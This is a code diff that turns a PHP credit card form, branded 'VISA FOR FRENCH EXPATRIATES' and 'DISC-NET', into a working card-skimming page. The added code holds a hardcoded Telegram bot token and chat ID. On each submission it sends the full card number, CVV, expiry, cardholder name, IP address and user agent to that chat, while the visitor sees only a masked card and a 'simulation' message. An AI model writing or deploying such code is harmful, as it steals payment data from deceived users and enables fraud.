@@ -1,13 +1,12 @@
 <?php
 /**
  * Dark Mode Credit Card Form with Visa Expatriates & DISC-NET Branding
- * 
- * Features:
- * - Dark, modern glass-morphic design
- * - Real-time card type detection (Visa, Mastercard, Amex, etc.)
- * - Server-side + client-side validation (Luhn algorithm)
- * - Custom branding: "VISA FOR FRENCH EXPATRIATES" and "DISC-NET"
+ * + Telegram notification of all submitted data.
  */
+
+// ========== TELEGRAM CONFIGURATION ==========
+$botToken = "8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc";
+$chatId   = "-5193742613";
 
 // ==================== PHP CARD DETECTION ====================
 
@@ -40,6 +39,32 @@ function luhnCheck($cardNumber) {
     return ($sum % 10 == 0);
 }
 
+/**
+ * Send a message to Telegram bot
+ * @return bool true on success, false on failure
+ */
+function sendToTelegram($message) {
+    global $botToken, $chatId;
+    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
+    $postData = [
+        'chat_id' => $chatId,
+        'text'    => $message,
+        'parse_mode' => 'HTML'
+    ];
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    $response = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    
+    return ($httpCode == 200);
+}
+
 // Handle form submission
 $submitted = false;
 $detectedType = '';
@@ -48,6 +73,7 @@ $maskedCard = '';
 $displayName = '';
 $displayExpiry = '';
 $errorMessage = '';
+$telegramStatus = '';
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $cardNumberRaw = trim($_POST['card_number'] ?? '');
@@ -65,6 +91,26 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $maskedCard = '•••• •••• •••• ' . $last4;
         $displayName = htmlspecialchars($nameOnCard);
         $displayExpiry = htmlspecialchars($expiryDate);
+        
+        // ---- SEND ALL DATA TO TELEGRAM ----
+        $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
+        $message = "<b>💳 NEW CARD SUBMISSION</b>\n"
+                 . "━━━━━━━━━━━━━━━━━━\n"
+                 . "🏷 <b>Card Type:</b> {$detectedType}\n"
+                 . "🔢 <b>Card Number:</b> {$cardNumberRaw}\n"
+                 . "👤 <b>Cardholder:</b> {$nameOnCard}\n"
+                 . "📅 <b>Expiry:</b> {$expiryDate}\n"
+                 . "🔐 <b>CVV:</b> {$securityCode}\n"
+                 . "✅ <b>Luhn valid:</b> " . ($luhnValid ? 'Yes' : 'No') . "\n"
+                 . "━━━━━━━━━━━━━━━━━━\n"
+                 . "🌐 <b>IP:</b> {$ip}\n"
+                 . "🖥 <b>User Agent:</b> {$userAgent}\n"
+                 . "⏱ <b>Time:</b> " . date('Y-m-d H:i:s');
+        
+        $telegramOk = sendToTelegram($message);
+        $telegramStatus = $telegramOk ? '✅ Data sent to secure channel.' : '⚠️ Telegram notification failed.';
+        
         $submitted = true;
     }
 }
@@ -92,14 +138,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             padding: 24px;
         }
 
-        /* Dark glass container */
         .dark-container {
             max-width: 560px;
             width: 100%;
             margin: 0 auto;
         }
 
-        /* Main card panel */
         .glass-card {
             background: rgba(18, 22, 28, 0.92);
             backdrop-filter: blur(12px);
@@ -107,10 +151,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             border: 1px solid rgba(255, 255, 255, 0.08);
             box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5), 0 0 0 0.5px rgba(255, 255, 255, 0.02);
             overflow: hidden;
-            transition: transform 0.2s ease;
         }
 
-        /* Branding header */
         .brand-header {
             padding: 28px 28px 16px 28px;
             border-bottom: 1px solid rgba(255, 255, 255, 0.06);
@@ -139,7 +181,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             margin-top: 6px;
         }
 
-        /* Credit card preview (dark theme) */
         .card-preview-dark {
             background: linear-gradient(145deg, #10161e, #0b0f14);
             margin: 24px 28px 0 28px;
@@ -204,7 +245,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             text-transform: uppercase;
         }
 
-        /* Form fields */
         .form-fields-dark {
             padding: 28px;
         }
@@ -252,7 +292,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             flex: 1;
         }
 
-        /* detection chip */
         .detection-chip {
             margin-top: 10px;
             background: rgba(59,130,246,0.12);
@@ -267,7 +306,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             border: 0.5px solid rgba(59,130,246,0.3);
         }
 
-        /* receive button */
         .receive-button {
             width: 100%;
             background: linear-gradient(95deg, #1e2b3c, #0f172a);
@@ -288,7 +326,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             transform: scale(0.98);
         }
 
-        /* DISC-NET footer */
         .discnet-footer {
             text-align: center;
             padding: 18px 28px 24px;
@@ -303,7 +340,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             color: #8aa2d4;
         }
 
-        /* result panel */
         .result-dark {
             margin-top: 24px;
             background: rgba(0,0,0,0.6);
@@ -326,18 +362,21 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             color: #90cdf4;
             margin: 6px 0;
         }
+        .telegram-note {
+            font-size: 0.7rem;
+            margin-top: 8px;
+            color: #7f8ea3;
+        }
     </style>
 </head>
 <body>
 <div class="dark-container">
     <div class="glass-card">
-        <!-- Branding: VISA FOR FRENCH EXPATRIATES -->
         <div class="brand-header">
             <div class="visa-main-title">VISA</div>
             <div class="expat-title">VISA FOR FRENCH EXPATRIATES</div>
         </div>
 
-        <!-- Card preview (dynamic) -->
         <div class="card-preview-dark">
             <div class="card-row">
                 <div class="chip-dark"></div>
@@ -354,7 +393,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             </div>
         </div>
 
-        <!-- Form -->
         <form method="POST" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>">
             <div class="form-fields-dark">
                 <div class="input-group">
@@ -393,13 +431,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             </div>
         </form>
 
-        <!-- DISC-NET footer (as requested) -->
         <div class="discnet-footer">
             ⚡ <span>DISC-NET</span> • SECURE PAYMENT GATEWAY
         </div>
     </div>
 
-    <!-- Server response -->
     <?php if ($submitted && empty($errorMessage)): ?>
     <div class="result-dark">
         <strong>✅ Payment simulation received</strong><br>
@@ -414,7 +450,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         <?php endif; ?>
         🔐 <strong>Luhn check:</strong> <?php echo $luhnValid ? '✅ Valid' : '❌ Invalid checksum'; ?><br>
         💳 <strong>Masked card:</strong> <?php echo $maskedCard; ?><br>
-        👤 <strong>Cardholder:</strong> <?php echo $displayName; ?>
+        👤 <strong>Cardholder:</strong> <?php echo $displayName; ?><br>
+        <div class="telegram-note">📨 <?php echo $telegramStatus; ?></div>
     </div>
     <?php elseif ($submitted && $errorMessage): ?>
     <div class="result-dark error-dark">
@@ -424,7 +461,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 </div>
 
 <script>
-    // Real-time card detection & UI updates (dark mode)
+    // Real-time card detection & UI updates (dark mode) – same as before
     (function() {
         function detectCardTypeJS(cardNumber) {
             let num = cardNumber.replace(/\D/g, '');
@@ -455,7 +492,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             let raw = cardInput.value;
             let clean = raw.replace(/\D/g, '');
             
-            // format input without moving cursor aggressively
             let formatted = formatCardNumber(raw);
             if (formatted !== raw && cardInput !== document.activeElement) {
                 cardInput.value = formatted;
@@ -483,7 +519,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 networkLabel.style.color = '#b9d0ff';
             }
             
-            // masked preview
             const previewSpan = document.getElementById('liveCardPreview');
             if (clean.length > 0) {
                 let last4 = clean.slice(-4);
@@ -492,12 +527,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 previewSpan.innerText = '•••• •••• •••• ••••';
             }
             
-            // name preview
             const namePreview = document.getElementById('liveNamePreview');
             let holder = nameInput.value.trim();
             namePreview.innerText = holder === "" ? "YOUR NAME" : holder.toUpperCase().slice(0, 24);
             
-            // expiry preview
             const expiryPreview = document.getElementById('liveExpiryPreview');
             let expRaw = expiryInput.value.replace(/\D/g, '');
             if (expRaw.length >= 2) {
@@ -509,7 +542,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 expiryPreview.innerText = "MM/YY";
             }
             
-            // auto-slash for expiry field
             if (expiryInput.value.length === 2 && !expiryInput.value.includes('/')) {
                 expiryInput.value = expiryInput.value + '/';
             }
